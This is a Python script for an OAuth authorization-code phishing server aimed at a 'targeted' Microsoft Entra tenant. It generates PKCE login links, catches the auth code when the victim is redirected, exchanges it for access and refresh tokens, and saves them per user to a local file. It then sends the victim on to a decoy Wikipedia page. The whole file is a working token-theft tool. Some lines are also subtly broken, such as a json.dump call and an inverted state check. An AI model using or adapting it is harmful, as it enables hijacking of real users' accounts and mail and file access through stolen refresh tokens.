#!/usr/bin/env python3
import http.server
import json
import jwt
import pkce
import random
import requests
import socketserver
import string
import urllib
import os
import ssl

from http import HTTPStatus

BASE_HOST = "https://login.microsoftonline.com"


def generateState():
    return "".join(random.choices(string.ascii_letters, k=8))


class AuthCodeHandler(http.server.BaseHTTPRequestHandler):
    def __init__(self, request: bytes, client_address,
                 server: socketserver.BaseServer):
        super().__init__(request, client_address, server)

    def write_token_to_file(self, content):
        response_map = json.loads(content)
        access_token = response_map.get("access_token", None)
        if not access_token:
            print("[!] No access token returned in response")
            return

        decoded_jwt = jwt.decode(access_token, options={'verify_signature':
                                                        False})
        upn = decoded_jwt.get('upn', None)
        if not upn:
            print("[!] upn claim missing from token")
            return

        iat = decoded_jwt.get('iat', None)
        if not iat:
            print("[!] iat claim missing from token")

        refresh_token = response_map.get("refresh_token", None)

        if not os.path.exists(self.server.output_file):
            with open(self.server.output_file, 'w') as f:
                f.write(json.dump({}))
                f.close()

        with open(self.server.output_file, 'r') as output_file:
            try:
                data_map = json.loads(output_file.read())
            except json.JSONDecodeError:
                print("Invalid format for output file. Overwriting \
                      with empty data")
                data_map = {}

        token_map = data_map.get("tokens", {})
        user_tokens = token_map.get(upn, [])
        user_tokens.append((
            {'iat': iat,
             'access_token': access_token,
             'refresh_token': refresh_token}))
        token_map[upn] = user_tokens
        data_map['tokens'] = token_map

        with open(self.server.output_file, 'w') as output_file:
            file_data = json.dumps(data_map)
            output_file.write(file_data)

    def write_pkce_codes_to_file(self, code_challenge, code_verifier):
        if not os.path.exists(self.server.output_file):
            with open(self.server.output_file, 'w') as f:
                f.write(json.dumps({}))
                f.close()

        with open(self.server.output_file, 'r') as output_file:
            try:
                data_map = json.loads(output_file.read())
            except json.JSONDecodeError:
                print("Invalid format for output file. Overwriting with \
                      empty data")
                data_map = {}

        code_map = data_map.get("pkce_codes", {})
        code_map[code_challenge] = code_verifier
        data_map['pkce_codes'] = code_map

        with open(self.server.output_file, 'w') as output_file:
            file_data = json.dumps(data_map)
            output_file.write(file_data)

    def get_token_from_code(self, state, auth_code):
        code_verifier = self.server.pkce_mappings.get(state, None)
        if not code_verifier:
            self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
            self.end_headers()
            self.wfile.write("No code verifier for provided state")

        request_url = f"{BASE_HOST}/{self.server.tenant_id}/oauth2/v2.0/token"
        request_body = {}
        request_body["client_id"] = self.server.client_id
        request_body["scope"] = self.server.scope
        request_body["code"] = auth_code
        request_body["redirect_uri"] = self.server.redirect_uri
        request_body["grant_type"] = "authorization_code"
        request_body["code_verifier"] = code_verifier

        response = requests.post(request_url, data=request_body)
        if response.status_code == 200:
            self.write_token_to_file(response.content)
        else:
            print(response.content)

        self.send_response(301)
        self.send_header('Location',
                         self.server.landing_page)
        self.end_headers()

    def generate_url(self):
        state = generateState()
        code_verifier, code_challenge = pkce.generate_pkce_pair()
        self.write_pkce_codes_to_file(code_challenge, code_verifier)
        self.server.pkce_mappings[state] = code_verifier
        url = (
                f"{BASE_HOST}/{self.server.tenant_id}/oauth2/v2.0/authorize"
                f"?client_id={self.server.client_id}"
                "&response_type=code"
                f"&redirect_uri={self.server.redirect_uri}"
                "&response_mode=query"
                f"&scope={self.server.scope}"
                f"&state={state}"
                f"&code_challenge={code_challenge}"
                "&code_challenge_method=S256"
        )

        return url

    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        if parsed_url.path == self.server.urlpath:
            query_map = urllib.parse.parse_qs(parsed_url.query)
            code = query_map.get('code', None)[0]
            state = query_map.get('state', None)[0]
            if not state and code:
                self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR,
                                "Missing state or code")
                self.end_headers()
            else:
                self.get_token_from_code(state, code)
        elif self.path == "/generateurl":
            self.send_response(HTTPStatus.OK)
            self.end_headers()
            self.wfile.write(
                json.dumps({'url': self.generate_url()}).encode('utf8'))


def start():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--redirect-uri", help="The redirect URI to use in \
                        the link", required=True)
    parser.add_argument("--scope", help="The scope of the token",
                        default="https://graph.microsoft.com/.default+offline_access")
    parser.add_argument("--urlpath", help="The path that the auth code \
                        will be redirected to", default="/")
    parser.add_argument("--port", help="The port to listen on", required=True)
    parser.add_argument("--client-id", help="The client id of the authorizing \
                        app", required=True)
    parser.add_argument("--tenant-id", help="The ID of the targeted tenant",
                        required=True)
    parser.add_argument("--output-file", help="The file to write obtained \
                        tokens", default="tokens.json")
    parser.add_argument("--cert-file", help="Path to the SSL certificate file", required=True)
    parser.add_argument("--landing-page", help="The page the user will be \
                        redirected to after the code exchange",
                        default="https://en.wikipedia.org/wiki/Snallygaster")
    args = parser.parse_args()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(args.cert_file)
    server = socketserver.TCPServer(('127.0.0.1', int(args.port)),
                                    AuthCodeHandler)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    server.redirect_uri = args.redirect_uri
    server.scope = args.scope
    server.urlpath = args.urlpath
    server.client_id = args.client_id
    server.tenant_id = args.tenant_id
    server.pkce_mappings = {}
    server.output_file = args.output_file
    server.landing_page = args.landing_page
    try:
        server.serve_forever()
    finally:
        server.shutdown()


if __name__ == "__main__":
    start()
